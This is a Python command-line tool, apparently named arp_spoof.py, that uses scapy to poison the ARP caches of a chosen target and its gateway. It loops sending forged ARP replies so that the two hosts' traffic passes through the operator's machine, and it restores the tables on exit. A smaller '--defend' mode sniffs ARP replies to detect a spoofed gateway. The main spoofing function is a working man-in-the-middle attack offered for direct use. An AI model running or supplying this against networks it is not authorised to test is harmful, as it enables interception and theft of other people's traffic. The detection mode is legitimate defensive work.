"""
███████╗       ██╗██╗ ███╗   ██╗ ████████╗ ██╗   ██╗
██╔════╝     ██╔╝ ██║ ████╗  ██║ ╚══██╔══╝ ╚██╗ ██╔╝
███████╗   ██╔╝   ██║ ██╔██╗ ██║    ██║     ╚████╔╝ 
╚════██║  ██████████║ ██║╚██╗██║    ██║      ╚██╔╝  
███████║  ╚═══════██║ ██║ ╚████║    ██║       ██║   
╚══════╝          ╚═╝ ╚═╝  ╚═══╝    ╚═╝       ╚═╝
spoof ARP, go crazy af
"""
import sys
import os
import time
import socket
import platform
import subprocess
import re
import uuid
from datetime import datetime

try:
    from scapy.all import conf, Ether, ARP, srp, sendp, sniff, get_if_hwaddr
    SCAPY_AVAILABLE = True
except ImportError:
    conf = None
    Ether = None
    ARP = None
    srp = None
    sendp = None
    sniff = None
    get_if_hwaddr = None
    SCAPY_AVAILABLE = False


def get_local_ip(override_ip=None):
    if override_ip:
        return override_ip.strip()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def get_local_mac():
    if conf and get_if_hwaddr:
        try:
            mac = get_if_hwaddr(conf.iface)
            if mac and mac != "00:00:00:00:00:00":
                return mac.lower()
        except Exception:
            pass

    if Ether:
        try:
            mac = Ether().src
            if mac and mac != "00:00:00:00:00:00":
                return mac.lower()
        except Exception:
            pass

    try:
        mac_hex = f"{uuid.getnode():012x}"
        return ":".join(mac_hex[i:i+2] for i in range(0, 12, 2)).lower()
    except Exception:
        return "00:00:00:00:00:00"


def get_default_gateway(override_gw=None):
    if override_gw:
        return override_gw.strip()

    os_type = platform.system().lower()

    if conf:
        try:
            gw = conf.route.route("0.0.0.0")[2]
            if gw and gw != "0.0.0.0":
                return gw
        except Exception:
            pass

    if "windows" in os_type:
        try:
            output = subprocess.check_output("route print 0.0.0.0", shell=True).decode('utf-8', errors='ignore')
            for line in output.splitlines():
                if "0.0.0.0" in line:
                    parts = line.strip().split()
                    if len(parts) >= 3 and parts[0] == "0.0.0.0" and parts[1] == "0.0.0.0":
                        return parts[2]
        except Exception:
            pass

    try:
        output = subprocess.check_output("ip route show default", shell=True).decode('utf-8', errors='ignore')
        match = re.search(r"default via ([\d\.]+)", output)
        if match:
            return match.group(1)
    except Exception:
        pass

    local_ip = get_local_ip()
    if local_ip != "127.0.0.1":
        parts = local_ip.split(".")
        return f"{parts[0]}.{parts[1]}.{parts[2]}.1"

    return "192.168.1.1"


def get_system_arp_table():
    arp_map = {}
    try:
        output = subprocess.check_output("arp -a", shell=True).decode('utf-8', errors='ignore')
        for line in output.splitlines():
            match = re.search(
                r"(\b\d{1,3}(?:\.\d{1,3}){3}\b)\s+([0-9a-fA-F]{2}[:-][0-9a-fA-F]{2}[:-][0-9a-fA-F]{2}[:-][0-9a-fA-F]{2}[:-][0-9a-fA-F]{2}[:-][0-9a-fA-F]{2})",
                line
            )
            if match:
                ip = match.group(1)
                mac = match.group(2).replace("-", ":").lower()
                if mac not in ["ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"]:
                    arp_map[ip] = mac
    except Exception:
        pass
    return arp_map


def resolve_mac(ip, timeout=1.5, retries=2, wake_device=True):
    if not ip:
        return None

    ip = ip.strip()
    local_ip = get_local_ip()

    if ip == local_ip:
        return get_local_mac()

    if wake_device:
        try:
            cmd = ["ping", "-n", "1", "-w", "500", ip] if platform.system().lower() == "windows" else ["ping", "-c", "1", "-W", "1", ip]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1.0)
        except Exception:
            pass

    if srp and Ether and ARP:
        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            ans, _ = srp(pkt, timeout=timeout, retry=retries, verbose=0)
            if ans:
                for _, rcv in ans:
                    if rcv.hwsrc:
                        return rcv.hwsrc.lower()
        except Exception:
            pass

    arp_table = get_system_arp_table()
    if ip in arp_table:
        return arp_table[ip]

    return None


def prompt_resolve_mac(ip_addr, label="Target"):
    mac = resolve_mac(ip_addr)
    if mac:
        return mac

    while not mac:
        print(f"\n[!] Could not resolve MAC for {label} ({ip_addr})")
        print("  1. Retry resolution (unlock/wake device screen)")
        print("  2. Enter MAC manually")
        print("  3. Exit")
        choice = input("Select [1-3]: ").strip()

        if choice == "1":
            print(f"[*] Retrying resolution for {ip_addr}...")
            mac = resolve_mac(ip_addr, timeout=2.5, retries=3, wake_device=True)
            if mac:
                return mac
            print("[!] No response.")
        elif choice == "2":
            manual = input(f"[?] Enter MAC for {ip_addr}: ").strip()
            if re.match(r"^([0-9a-fA-F]{2}[:-]){5}([0-9a-fA-F]{2})$", manual):
                return manual.replace("-", ":").lower()
            print("[!] Invalid MAC format.")
        elif choice == "3":
            return None


def start_watchdog():
    gateway_ip = get_default_gateway()
    print(f"\n[*] ARP Watchdog running. Gateway: {gateway_ip}")
    gateway_real_mac = resolve_mac(gateway_ip, timeout=2.0, retries=2, wake_device=False)
    if gateway_real_mac:
        print(f"[+] Gateway MAC: {gateway_real_mac}")
    print("[*] Monitoring ARP replies (Ctrl+C to stop)...\n")

    def process_arp(packet):
        if packet.haslayer(ARP) and packet[ARP].op == 2:
            src_ip = packet[ARP].psrc
            src_mac = packet[ARP].hwsrc.lower()
            timestamp = datetime.now().strftime("%H:%M:%S")

            if src_ip == gateway_ip:
                if gateway_real_mac and src_mac != gateway_real_mac.lower():
                    print(f"\n[{timestamp}] [ALERT] ARP Poisoning Detected! Gateway {gateway_ip} spoofed by {src_mac} (Legit: {gateway_real_mac})\n")
                else:
                    print(f"[{timestamp}] Valid ARP reply from {gateway_ip} ({src_mac})")

    try:
        sniff(filter="arp", prn=process_arp, store=False)
    except KeyboardInterrupt:
        print("\n[*] Watchdog stopped.\n")


def spoof(target_ip=None, gateway_ip=None, my_ip=None):
    auto_my_ip = get_local_ip()
    auto_gw = get_default_gateway()

    print(f"\n[*] Local IP  : {auto_my_ip}")
    print(f"[*] Gateway IP: {auto_gw}")

    if not my_ip:
        inp_my_ip = input(f"[?] Your IP [Enter for {auto_my_ip}]: ").strip()
        local_ip = inp_my_ip if inp_my_ip else auto_my_ip
    else:
        local_ip = my_ip

    if not gateway_ip:
        inp_gw = input(f"[?] Gateway IP [Enter for {auto_gw}]: ").strip()
        gateway_ip = inp_gw if inp_gw else auto_gw

    if not target_ip:
        target_ip = input("[?] Target IP: ").strip()

    if not target_ip or target_ip == local_ip:
        print("[!] Invalid target IP.")
        return

    if not SCAPY_AVAILABLE:
        print("[!] Scapy/Npcap driver not found.")
        return

    print("\n[*] Resolving MAC addresses...")
    target_mac = prompt_resolve_mac(target_ip, label="Target")
    if not target_mac:
        return

    gateway_mac = resolve_mac(gateway_ip, wake_device=False)
    if not gateway_mac:
        gateway_mac = prompt_resolve_mac(gateway_ip, label="Gateway")
        if not gateway_mac:
            return

    my_mac = get_local_mac()

    print(f"  Target  : {target_ip} ({target_mac})")
    print(f"  Gateway : {gateway_ip} ({gateway_mac})")
    print(f"  Host    : {local_ip} ({my_mac})\n")

    pkt_to_target = Ether(src=my_mac, dst=target_mac) / ARP(
        op=2, hwsrc=my_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip
    )

    pkt_to_gateway = Ether(src=my_mac, dst=gateway_mac) / ARP(
        op=2, hwsrc=my_mac, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip
    )

    print(f"[*] Spoofing: {target_ip} <---> {gateway_ip} (Ctrl+C to stop)\n")

    packets_sent = 0
    try:
        while True:
            sendp(pkt_to_target, verbose=0)
            sendp(pkt_to_gateway, verbose=0)
            packets_sent += 2
            print(f"\r[+] Spoofing active | Packets sent: {packets_sent}", end="", flush=True)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[*] Restoring ARP tables...")
        restore_target = Ether(src=gateway_mac, dst=target_mac) / ARP(
            op=2, hwsrc=gateway_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip
        )
        restore_gw = Ether(src=target_mac, dst=gateway_mac) / ARP(
            op=2, hwsrc=target_mac, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip
        )
        for _ in range(5):
            try:
                sendp(restore_target, verbose=0)
                sendp(restore_gw, verbose=0)
                time.sleep(0.1)
            except Exception:
                pass
        print("[+] Restored.\n")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        arg = sys.argv[1].strip()
        if arg in ["--defend", "-d"]:
            start_watchdog()
        elif arg in ["--scan", "-s"]:
            from devices import scan_network
            scan_network()
        elif arg in ["--help", "-h"]:
            print("Usage: python arp_spoof.py [target_ip] [gateway_ip] | --defend | --scan")
        else:
            gw = sys.argv[2] if len(sys.argv) > 2 else None
            spoof(target_ip=arg, gateway_ip=gw)
    else:
        spoof()